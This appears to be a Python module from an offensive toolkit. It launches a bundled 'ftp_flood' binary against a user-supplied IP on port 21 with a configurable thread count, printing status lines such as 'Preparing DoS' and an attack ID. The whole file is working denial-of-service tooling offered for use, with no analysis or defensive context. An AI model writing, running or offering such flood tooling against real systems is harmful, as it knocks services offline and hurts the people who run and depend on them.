import subprocess
import os
from rootmap import ROOT

REQUIRED_OPTIONS = {"IP": "", "THREAD": "example: 1000"}


def execute(options):
    target = options.get("IP")
    port = "21"
    threads = options.get("THREAD")

    bindir = os.path.join(ROOT, "external", "source", "binary")
    bin_path = os.path.join(bindir, "ftp_flood")

    if not target:
        print("[-] ERROR: TARGET is missing!")
        return

    print(f"[*] Preparing DoS to {target}:{port}")

    try:
        process = subprocess.Popen(
            [bin_path, "-t", target, "-p", port, "-w", threads],
            stdout=None,
            stderr=None,
        )

        print(f"[!] Attack ID: {process.pid}")
        print("[!] Press Ctrl+C to stop the flood.")

        process.wait()

    except KeyboardInterrupt:
        process.terminate()
    except Exception as e:
        print(f"[-] ERROR: {e}")
